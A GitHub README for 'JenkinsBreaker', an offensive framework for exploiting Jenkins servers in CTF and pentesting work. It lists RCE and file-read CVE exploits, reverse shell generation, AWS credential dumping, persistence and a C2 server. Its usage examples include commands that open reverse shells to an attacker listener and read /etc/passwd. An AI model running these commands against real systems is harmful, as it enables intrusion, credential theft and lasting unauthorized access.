# JenkinsBreaker 🏴‍☠️  
An Advanced Python Offensive Security Framework for Jenkins Exploitation in CTF and Pentesting Scenarios  

---

## Features  

- ✅ **Automated Enumeration & Exploitation** (`--auto` mode)  
- ✅ **Exploit Critical CVEs**:  
  - CVE-2019-1003029 / CVE-2019-1003030 – *Groovy Script RCE*  
  - CVE-2024-23897 – *Arbitrary File Read via CLI*  
  - CVE-2025-31720 / CVE-2025-31721 / CVE-2025-31722 – *Custom & Upcoming CVEs Included*  
- ✅ **Reverse Shell Payload Generation** (Bash, Python, Groovy, PowerShell, Metasploit Compatible)  
- ✅ **AWS Credential Dumping & Secrets Scanning**  
- ✅ **CSRF Crumb Handling & Automation**  
- ✅ **JWT Token Brute-Forcing and Analysis**  
- ✅ **Post-Exploitation Recon Automation** (Auto Upload & Execute linPEAS, pspy)  
- ✅ **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)  
- ✅ **Built-in C2 Server (FastAPI) & Interactive WebSocket Shell (not functional with this release)**  
- ✅ **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)  
- ✅ **Modular Exploit Loading** (`exploits/` Directory)  

---

## 📅 Coming Soon (Planned Features)  

- 🖥**Full Visual Interface** (TUI & Web UI) using *textual* and *fastapi*  
- **Enhanced Plugin Fuzzer** with *ML-Based Misconfiguration Detection*  
- **Interactive Dashboards** for Exploit Results and Reporting  

---

## Installation  

```bash
git clone https://github.com/ridpath/heaplessNights.git
cd heaplessNights/JenkinsBreaker
python3 JenkinsBreaker.py --help  # Auto-creates virtualenv and installs dependencies
```
```bash
##⚔️ Example Usage
Automatic Enumeration & Exploitation:
python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444

Run Specific CVE Exploit:
python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --exploit-cve --target-file /etc/passwd

Generate a Reverse Shell:
python3 JenkinsBreaker.py --generate-shell bash --lhost YOUR_IP --lport 4444

List All Available Commands:
python3 JenkinsBreaker.py --help-commands
```
## Note
This tool is under active development. A full-fledged UI will soon make managing exploits and post-exploitation workflows more intuitive. Stay tuned for upcoming releases!
Working through multiple bugs.




